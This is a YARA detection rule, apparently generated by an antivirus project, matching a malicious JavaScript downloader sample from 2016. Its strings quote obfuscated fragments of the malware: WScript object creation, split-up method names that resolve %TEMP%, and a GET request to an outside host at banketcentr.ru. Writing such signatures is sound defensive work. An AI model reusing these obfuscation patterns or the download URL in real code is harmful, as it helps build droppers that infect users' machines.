rule sig_20160428_cadbc51e6ddd683fed1a771f032f830e {
  meta:
    description = "datamaliciousorder - file 20160428_cadbc51e6ddd683fed1a771f032f830e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "68034d92ed47383d4c36efea7c5b2d744b3126ea83fcc12e11e5d14a25be34ae"

  strings:
    $s1  = "function PzdZkcDmzCcoMpxEnkQxl(PibQqwYbbCbdBznIskYyg, QhbJlcYyuIzfMfiVkaGap){GppKhcJieCfcKvlCmqUoc = GppKhcJieCfcKvlCmqUoc * 1; " ascii
    $s2  = "function AweEwaIggInnEjaGswByt(BmxYdhJodStmZwfUkeWjh){JbiDyrAmhNnmZjtFbeCyr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function TgyFojExqPwxCzoMvuDor() {return JbiDyrAmhNnmZjtFbeCyr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function AweEwaIggInnEjaGswByt(BmxYdhJodStmZwfUkeWjh){JbiDyrAmhNnmZjtFbeCyr[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var JbiDyrAmhNnmZjtFbeCyr = function YzmSskZgeVuuBzuGyjWuc() {return FedPhcQetTfsYtyWmoYtc[OqsZibZxyTniZbrNzrXop](\"WScript\"+\"" ascii
    $s6  = "return PibQqwYbbCbdBznIskYyg - QhbJlcYyuIzfMfiVkaGap;};" fullword ascii
    $s7  = "function PzdZkcDmzCcoMpxEnkQxl(PibQqwYbbCbdBznIskYyg, QhbJlcYyuIzfMfiVkaGap){GppKhcJieCfcKvlCmqUoc = GppKhcJieCfcKvlCmqUoc * 1; " ascii
    $s8  = "TdmVvoTssEeaZrfVriUau[XjnHwqCnaZjsPlgPpzOvr](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s9  = "var JbiDyrAmhNnmZjtFbeCyr = function YzmSskZgeVuuBzuGyjWuc() {return FedPhcQetTfsYtyWmoYtc[OqsZibZxyTniZbrNzrXop](\"WScript\"+\"" ascii
    $s10 = "var FedPhcQetTfsYtyWmoYtc = this[\"WScript\"];" fullword ascii
    $s11 = "function TgyFojExqPwxCzoMvuDor() {return JbiDyrAmhNnmZjtFbeCyr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (TdmVvoTssEeaZrfVriUau[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function XcyXvbGjbRwfYupLxgCws(){return YezDtuTldUauImpGmrIbn + \"\";};" fullword ascii
    $s14 = "function OzqMbwMhbChlMllTmfTie() {return ((UxsSazOleBedEgrTzsMvf == true) && (UxsSazOleBedEgrTzsMvf == VegUbaGlpGacXhoDiiHri)) ?" ascii
    $s15 = "function OzqMbwMhbChlMllTmfTie() {return ((UxsSazOleBedEgrTzsMvf == true) && (UxsSazOleBedEgrTzsMvf == VegUbaGlpGacXhoDiiHri)) ?" ascii
    $s16 = "function OluCxpPlgCmhGanPajOmf(DarBpjLecXchJbtIktMzq) {var TsoNqzNbpOtdIpzHmqOub = (1, 2, 3, 4, 5, DarBpjLecXchJbtIktMzq); retur" ascii
    $s17 = "function OluCxpPlgCmhGanPajOmf(DarBpjLecXchJbtIktMzq) {var TsoNqzNbpOtdIpzHmqOub = (1, 2, 3, 4, 5, DarBpjLecXchJbtIktMzq); retur" ascii
    $s18 = "var VegUbaGlpGacXhoDiiHri = false;" fullword ascii
    $s19 = "function OiwGrbKntIeqYtiTgsVvm(){return OqsZibZxyTniZbrNzrXop;};" fullword ascii
    $s20 = "var GqcBnmKtlDmyPlwZmtEmn = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}